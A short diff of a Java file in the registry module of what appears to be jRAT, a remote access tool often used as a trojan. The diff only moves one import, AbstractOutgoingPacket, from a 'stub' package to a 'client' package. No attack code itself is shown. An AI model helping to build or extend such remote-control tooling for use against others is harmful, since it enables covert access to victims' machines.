@@ -1,7 +1,7 @@
 package jrat.module.registry;
 
 import io.jrat.common.io.StringWriter;
-import io.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
+import jrat.client.packets.outgoing.AbstractOutgoingPacket;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
